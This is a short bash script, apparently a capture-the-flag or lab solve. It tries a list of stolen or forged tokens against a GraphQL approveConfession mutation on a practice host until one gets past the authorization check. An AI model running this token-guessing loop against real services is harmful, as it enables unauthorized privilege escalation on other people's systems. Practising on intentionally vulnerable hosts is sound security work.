#!/bin/bash

# Include the tokens
declare -A tokens
source /workspace/all_tokens.sh

# Test each token
for secret in "${!tokens[@]}"; do
    TOKEN="${tokens[$secret]}"
    
    response=$(curl -s -X POST http://hackme3.vulnmachines.com:7800/graphql \
        -H "Content-Type: application/json" \
        -d "{\"query\":\"mutation { approveConfession(token: \\\"$TOKEN\\\", confessionId: 26) { confession { id content isApproved } message } }\"}")
    
    if [[ ! "$response" =~ "Invalid token" ]] && [[ ! "$response" =~ "do not have the privilege" ]]; then
        echo "SUCCESS with secret: $secret"
        echo "Response: $response"
        break
    else
        echo -n "."
    fi
done